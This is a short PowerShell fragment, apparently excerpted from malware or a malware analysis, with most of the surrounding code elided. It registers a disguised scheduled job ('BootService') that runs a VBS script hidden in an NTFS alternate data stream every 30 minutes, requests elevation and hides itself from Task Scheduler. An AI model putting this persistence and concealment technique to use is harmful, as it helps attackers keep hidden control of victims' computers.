...
#>
    ...
    if (!(Test-IsAdmin)){
       ...
       Register-ScheduledJob –Name BootService -ScriptBlock {wscript.exe $env:USERPROFILE\AppData:$vbsFile} –Trigger New-JobTrigger -Once -At "07:00 AM" -RepeatIndefinitely -RepetitionInterval "00:30:00" –ScheduledJobOption New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
